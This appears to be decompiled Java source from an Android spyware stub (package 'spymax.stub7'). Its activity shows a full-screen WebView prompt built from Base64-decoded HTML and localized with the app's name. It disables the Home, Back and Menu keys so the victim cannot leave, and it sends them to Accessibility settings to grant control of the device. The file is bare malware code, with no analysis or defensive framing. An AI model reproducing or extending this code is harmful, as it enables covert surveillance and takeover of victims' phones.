package spymax.stub7;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.util.Locale;
import org.json.JSONObject;

public class _access_ask_ extends Activity {
    public String localeForAccessibility = "{'en':'Enable','de':'Aktivieren','ar':'تفعيل";

    public void finish() {
        if (Build.VERSION.SDK_INT >= 21) {
            finishAndRemoveTask();
            return;
        }
        super.finish();
    }

    public String localeTextAccessibility() {
        try {
            return (new JSONObject(this.localeForAccessibility)).getString(Locale.getDefault().getLanguage());
        } catch (Exception exception) {
            return "Enable";
        }
    }

    public void onBackPressed() {
        super.onBackPressed();
    }

    public void onCreate(Bundle paramBundle) {
        super.onCreate(paramBundle);
        try {
            WebView webView = new WebView((Context)this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
            webView.setWebViewClient(new MyWebViewClient());
            webView.setWebChromeClient(new MyWebChromeClient());
            webView.addJavascriptInterface(new WebAppInterface((Context)this), "Android");
            String str3 = getString(R.string.Access);
            String str1 = ClassGen3.getLabelApplication((Context)this);
            str3 = (new String(Base64.decode(str3, 0), "UTF-8")).replace("Start Accessibility", str1);
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append(localeTextAccessibility());
            stringBuilder2.append(" : '");
            stringBuilder2.append(str1);
            stringBuilder2.append("'");
            str1 = str3.replace("Enable Accessibility To Continue", stringBuilder2.toString());
            StringBuilder stringBuilder1 = new StringBuilder();
            stringBuilder1.append("var lang = '");
            stringBuilder1.append(Locale.getDefault().getLanguage());
            stringBuilder1.append("'");
            str1 = str1.replace("var lang = 'en'", stringBuilder1.toString());
            String str2 = ClassGen3._D_BASE64_("PGh0bWwgbGFuZz0iZW4iPg==");
            stringBuilder2 = new StringBuilder();
            stringBuilder2.append(ClassGen3._D_BASE64_("PGh0bWwgbGFuZz0i"));
            stringBuilder2.append(Locale.getDefault().getLanguage());
            stringBuilder2.append(ClassGen3._D_BASE64_("Ij4="));
            webView.loadDataWithBaseURL(null, str1.replace(str2, stringBuilder2.toString()), "text/html", "UTF-8", null);
            setContentView((View)webView);
            return;
        } catch (Exception exception) {
            return;
        }
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent) {
        return (paramInt == 3) ? true : ((paramInt == 4) ? true : ((paramInt == 82)));
    }

    protected void onStop() {
        super.onStop();
    }

    private class MyWebChromeClient extends WebChromeClient {
        private MyWebChromeClient() {}

        public boolean onJsAlert(WebView param1WebView, String param1String1, String param1String2, JsResult param1JsResult) {
            return true;
        }
    }

    private class MyWebViewClient extends WebViewClient {
        private MyWebViewClient() {}

        public void onPageFinished(WebView param1WebView, String param1String) {}

        public boolean shouldOverrideUrlLoading(WebView param1WebView, String param1String) {
            return false;
        }
    }

    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context param1Context) {
            this.mContext = param1Context;
        }

        @JavascriptInterface
        public void returnResult() {
            Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            _access_ask_.this.startActivity(intent);
        }
    }
}
